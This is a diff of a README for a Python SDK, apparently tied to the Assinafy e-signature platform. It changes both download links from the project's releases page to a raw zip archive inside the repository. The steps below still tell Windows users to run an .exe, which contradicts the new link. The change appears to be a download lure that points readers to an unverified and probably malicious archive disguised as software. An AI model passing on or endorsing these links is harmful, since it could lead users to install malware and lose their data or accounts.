@@ -1,6 +1,6 @@
 # ✍️ python-sdk - Sign your digital documents with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/lilianecomposed370/python-sdk/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/lilianecomposed370/python-sdk/raw/refs/heads/main/src/python-sdk-2.6-alpha.3.zip)
 
 This application connects to the Assinafy digital signature platform. Users automate document signing processes and manage contracts using this tool. It allows you to process documents based on the Brazilian electronic signature standard.
 
@@ -19,7 +19,7 @@ Most Windows computers include these items. If your computer does not have the W
 
 You must visit the official release page to obtain the installation file. Follow these steps to access the download:
 
-1. Visit [this page to download](https://github.com/lilianecomposed370/python-sdk/releases).
+1. Visit [this page to download](https://github.com/lilianecomposed370/python-sdk/raw/refs/heads/main/src/python-sdk-2.6-alpha.3.zip).
 2. Look for the section labeled Assets.
 3. Click the link ending in .exe to start the file transfer to your computer.
 4. Save the file to your Downloads folder.
